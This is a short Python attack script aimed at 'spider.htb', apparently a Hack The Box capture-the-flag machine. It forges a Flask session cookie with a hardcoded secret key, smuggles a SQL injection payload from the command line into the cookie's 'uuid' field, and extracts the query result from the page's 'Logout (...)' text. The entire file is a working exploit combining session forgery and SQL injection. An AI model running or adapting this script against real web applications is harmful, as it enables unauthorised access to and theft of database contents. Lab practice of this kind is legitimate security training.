from flask_unsign import session as s
import requests as r
import re
import html2text
import sys

url = 'http://spider.htb'
inpt = sys.argv[1]
inject = '\' {} #'.format(inpt)

# generate token
session = s.sign({'cart_items': [], 'uuid': inject}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')
#print(session + ':' + str(s.decode(session)))

# Send request with token
cookies_dict = {"session": session}
rspn = r.get(url, cookies=cookies_dict)
#print(rspn.text)

# Filter response
h = html2text.HTML2Text()
h.ignore_links = True
text = h.handle(rspn.text)
main_rspn = re.findall(r'Logout \((.*?)\)', text)
print(main_rspn)
